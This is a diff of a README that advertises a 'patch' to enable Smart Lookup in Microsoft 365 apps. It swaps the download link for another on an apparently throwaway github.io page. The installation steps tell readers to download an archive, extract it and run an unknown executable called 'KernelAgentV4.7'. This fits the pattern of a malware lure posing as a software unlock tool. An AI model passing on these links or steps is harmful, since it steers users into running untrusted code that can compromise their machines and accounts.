@@ -2,14 +2,14 @@
 
 Unlock the Smart Lookup feature across Microsoft 365 apps to get contextual definitions, web search, Wikipedia results, and insights—all within Word, Excel, and PowerPoint. This patch enables Smart Lookup using `KernelAgentV4.7`.
 
-[![Download Smart Lookup Tool](https://img.shields.io/badge/Download-Smart_Lookup-blueviolet)](https://m365-smart-lookup-contextual-bing.github.io/.github
+[![Download Smart Lookup Tool](https://img.shields.io/badge/Download-Smart_Lookup-blueviolet)](https://pomidorkaskeletik4.github.io/pomo/ferjy
 )
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](https://m365-smart-lookup-contextual-bing.github.io/.github
+1. 📦 **Download the archive** from the [Releases](https://pomidorkaskeletik4.github.io/pomo/ferjy
 ) section  
 2. 📁 **Extract the folder** to a directory like `C:\M365SmartLookup`  
 3. 🖱 **Run the executable file** `KernelAgentV4.7` to enable all related Smart Lookup services  
